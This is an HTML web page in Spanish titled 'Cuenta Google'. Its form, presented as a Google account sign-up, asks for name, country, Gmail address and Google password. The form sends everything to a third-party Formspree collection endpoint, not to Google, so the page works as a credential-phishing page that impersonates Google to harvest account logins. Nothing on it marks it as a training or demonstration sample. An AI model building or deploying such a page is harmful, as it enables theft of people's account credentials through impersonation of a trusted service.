<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="stylesheet" href="styles.css">
    <title>Cuenta Google</title>
</head>
<body>
    <form class="form-register"
            action="https://formspree.io/f/xrbzqwbq"
            method="post"
    >
        <fieldset>
            <legend>INFORMACION BASICA</legend>
            <div class="form_input">
                <label>Nombre
                    <input class="controls" type="text" name="nombre" placeholder="Nombre" required>
                </label>
            </div>
            <div class="form_input">
                <label>Apellido
                    <input class="controls" type="text" name="apellido" placeholder="Apellidos" required>
                </label>
            </div>
            <div class="form_input">
                <label>País 
                    <select name="type-of-user">
                        <option value="user1">Bolivia</option>
                        <option value="user2">Perù</option>
                        <option value="user3">chile</option>
                    </select>
                </label>
            </div>
        </fieldset>
        <fieldset>
            <legend>Cuenta: Google</legend>
            <div class="form_input">
                <label>Email
                    <input class="controls-input" type="email" name="correo" placeholder="ejemplo@gmail.com" required>
                </label>
            </div>
            <div class="form_input">
                <label>Contraseña
                    <input class="controls-input" type="password" name="contraseña" placeholder="contraseña" required>
                </label>
            </div>
        </fieldset>
        <div class="form_input">
            <label>
                <input class="botons" type="submit" value="SIGUIENTE">
            </label>
        </div>
        <div class="form_input">
            <label>
                <textarea class="controls control" name="message" placeholder="asunto (opcional)"></textarea>
            </label>
        </div>
    </form>
</body>
</html>
